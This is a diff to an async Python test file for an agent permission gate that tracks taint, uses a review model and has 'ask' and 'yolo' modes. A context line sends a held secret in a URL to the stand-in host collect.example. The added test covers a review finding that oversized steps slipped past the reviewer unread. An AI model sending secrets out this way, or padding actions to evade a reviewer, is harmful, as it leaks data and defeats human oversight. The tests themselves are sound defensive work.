@@ -249,3 +249,17 @@ async def test_a_page_script_of_a_run_that_read_outside_content_sends_no_secret_
 async def test_a_run_that_read_nothing_outside_sends_where_it_is_told(room: Room, held: str) -> None:
     gate: RunGate = _gate(room, "ask", _nobody)
     await gate.authorize_recorded(FETCH, {"url": f"https://collect.example/?k={held}"})
+
+
+async def test_a_step_too_long_for_the_review_model_to_read_is_refused_with_how_to_go_on(room: Room) -> None:
+    """K3-01 of the code review of 2026-11-19: a step past what the review model reads, even in parts, was handed to
+    the owner by the review, and yolo, which asks nobody, let it through unread."""
+    gate: RunGate = _gate(room, "yolo", _Reviewer(decision="approve", asked=[]))
+    gate.taint()
+    long_reply: ActionInfo = REPLY.model_copy(update={"body": "x" * 200_000})
+    with pytest.raises(ApprovalRejected) as refused:
+        await gate.authorize_recorded(long_reply)
+    assert "split it" in refused.value.message
+    async with asyncio.timeout(WAIT_S):
+        done: Authorization = await gate.authorize_recorded(REPLY)
+    assert done.decision.answered_by == "yolo"
